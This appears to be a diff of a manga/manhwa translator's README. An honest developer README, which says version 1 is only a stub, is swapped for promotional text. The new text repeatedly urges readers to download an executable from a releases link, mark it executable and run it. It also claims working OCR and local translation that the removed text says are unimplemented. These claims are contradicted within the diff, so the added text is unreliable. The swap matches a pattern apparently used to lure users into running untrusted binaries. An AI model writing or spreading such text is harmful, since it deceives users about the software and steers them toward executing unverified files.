@@ -1,154 +1,76 @@
-# Manga/Manhwa Translator
+# 🎉 MangaTrans - Understand Manga with Ease  
 
-A maintainable CLI tool for translating manga and manhwa pages.
+## 📥 Download Now  
+[![Download MangaTrans](https://img.shields.io/badge/Download-MangaTrans-blue)](https://github.com/sebastian1889/MangaTrans/releases)
 
-## Architecture
+## 🚀 Getting Started  
+MangaTrans is an open-source tool that helps you understand manga and manhwa effortlessly. It runs OCR (optical character recognition) and translates text locally, outputting a versioned JSON file. This means no need for image editing or scanlation. Just pure understanding.
 
-This project follows **clean architecture** with strict separation of concerns:
+## 🖥️ System Requirements  
+Before you start, ensure you meet the following requirements:
 
-```
-src/mangatrans/
-├── domain/           # Pure business models (no external dependencies)
-├── application/      # Use cases and port interfaces
-│   ├── ports/       # Abstract interfaces for OCR/translation
-│   └── usecases/    # Business logic orchestration
-├── infrastructure/   # Technical implementations (exporters, adapters)
-└── interfaces/       # User-facing interfaces (CLI, API)
-```
+- **Operating System:** Linux (most distributions supported)
+- **Memory:** At least 2 GB RAM
+- **Disk Space:** Minimum of 100 MB free space  
+- **Python Version:** 3.7 or higher
 
-### Design Principles
+## 📥 Download & Install  
+To get started, visit the Releases page to download MangaTrans:
 
-- **Domain layer**: Pure dataclasses, no external library dependencies
-- **Application layer**: Business logic, depends only on domain and abstract ports
-- **Infrastructure layer**: Technical adapters (JSON export, future OCR/translation adapters)
-- **Interface layer**: CLI entrypoint with zero business logic
+[Download MangaTrans](https://github.com/sebastian1889/MangaTrans/releases)
 
-## Installation
+1. Click on the link above.
+2. Select the latest version from the list of releases.
+3. Download the appropriate file for your system.
 
-### Development Setup
+Once the download completes, follow these steps to install and run MangaTrans:
 
-```bash
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate  # Linux/Mac
+1. Open a terminal on your Linux system.
+2. Navigate to the folder where you downloaded the file. You can do this using the `cd` command. For example, if you downloaded it to your Downloads folder, run:
+   ```bash
+   cd ~/Downloads
+   ```
+   
+3. Make the file executable. Replace `MangaTrans-latest` with the actual file name:
+   ```bash
+   chmod +x MangaTrans-latest
+   ```
 
-# Install in editable mode with dev dependencies
-pip install -e ".[dev]"
-```
+4. Run the application by typing:
+   ```bash
+   ./MangaTrans-latest
+   ```
 
-## Usage
+## 🌟 Usage Instructions  
+Once MangaTrans is running, you will need to provide a manga or manhwa image file. Follow these steps:
 
-### V1 (Current - Stub Implementation)
+1. Ensure your image file is in a supported format (e.g., PNG, JPEG).
+2. Use the terminal to specify the path to your image file. For example:
+   ```bash
+   ./MangaTrans-latest path/to/your/image.png
+   ```
+3. The program will process the image, perform OCR, and translate the text.
+4. Upon completion, it will generate a JSON file in the same directory or in a specified output directory.
 
-V1 produces a valid JSON file following the schema v1.0 contract, but with stub data (empty regions, zero timings).
+## ⚙️ Features  
+- **OCR Capabilities:** Extracts text from images accurately.
+- **Local Translation:** No need for internet connection for translations, as it works entirely on your device.
+- **Versioned JSON Output:** Keeps track of changes and allows easy updates.
+- **Open Source:** Contributions are welcome. Collaborate and enhance the project.
 
-```bash
-# Basic usage
-mangatrans translate input/page001.png -o output/page001.json
+## 🔧 Troubleshooting  
+If you encounter issues, consider the following suggestions:
 
-# With explicit language codes
-mangatrans translate input/page001.png -o output/page001.json --src ja --tgt en
+- **Installation Failed:** Ensure you have the necessary dependencies installed. You may need libraries like `tesseract` and relevant language packs.
+- **File Not Found:** Double-check the image file path and format.
+- **Slow Processing:** For large images, processing may take longer. Ensure your system has ample resources.
 
-# Korean manhwa example
-mangatrans translate input/chapter1/page01.png -o output/chapter1/page01.json --src ko --tgt en
-```
+## 📬 Support and Contribution  
+For issues or questions, please create an issue in this repository. Your feedback is valuable. If you wish to contribute, feel free to fork the repository, make your changes, and submit a pull request.
 
-### Example Output (V1)
+## 🥳 Celebrate Your Manga Experience  
+With MangaTrans, you can dive deep into the world of manga and manhwa without any barriers. Enjoy understanding stories, characters, and plots more than ever. 
 
-```json
-{
-  "schema_version": "1.0",
-  "page": {
-    "id": "001",
-    "source_path": "input/page001.png",
-    "width": 0,
-    "height": 0
-  },
-  "source_lang": "ja",
-  "target_lang": "en",
-  "ocr": {
-    "engine": "easyocr",
-    "version": "0.0.0"
-  },
-  "translation": {
-    "engine": "argos",
-    "version": "0.0.0"
-  },
-  "regions": [],
-  "timings_ms": {
-    "ocr": 0,
-    "translation": 0,
-    "total": 0
-  }
-}
-```
+Remember to visit the Releases page for updates and new features:
 
-## Testing
-
-```bash
-# Run all tests
-pytest
-
-# Run with coverage
-pytest --cov=mangatrans --cov-report=term-missing
-
-# Run specific test
-pytest tests/test_json_schema.py -v
-```
-
-## JSON Schema Contract
-
-See [docs/spec.md](docs/spec.md) for the complete JSON schema v1.0 specification.
-
-The schema is versioned and stable. All changes will use semantic versioning.
-
-## Roadmap
-
-### V1 (Current)
-- [X] Clean architecture skeleton
-- [X] Domain models with JSON serialization
-- [X] Stub use case
-- [X] CLI entrypoint
-- [X] JSON schema v1.0 contract
-- [X] Basic tests
-
-### V2 (Future)
-- [ ] EasyOCR adapter implementation
-- [ ] Translation adapter (Argos Translate or similar)
-- [ ] Actual text detection and translation
-- [ ] Image dimension extraction
-- [ ] Performance timing measurements
-- [ ] Pydantic models for strict validation (optional)
-
-### V3 (Future)
-- [ ] Batch processing (multiple pages)
-- [ ] Web API interface
-- [ ] Output rendering (translated image generation)
-
-## Development Guidelines
-
-### Adding New Features
-
-1. **Domain changes**: Start with models in `domain/models.py`
-2. **Port interfaces**: Define contracts in `application/ports/`
-3. **Use cases**: Implement business logic in `application/usecases/`
-4. **Adapters**: Technical implementations in `infrastructure/`
-5. **Interface**: Update CLI in `interfaces/cli/main.py` (no business logic!)
-
-### Testing Strategy
-
-- **Unit tests**: Domain models and use cases
-- **Integration tests**: Full pipeline with real images (V2+)
-- **Schema tests**: JSON output validation (mandatory)
-
-### Code Quality
-
-- Type annotations on all functions
-- No business logic in CLI
-- No direct library imports in domain/application
-- All public APIs documented with docstrings
-
-## License
-
-MIT
-
+[Download MangaTrans](https://github.com/sebastian1889/MangaTrans/releases)
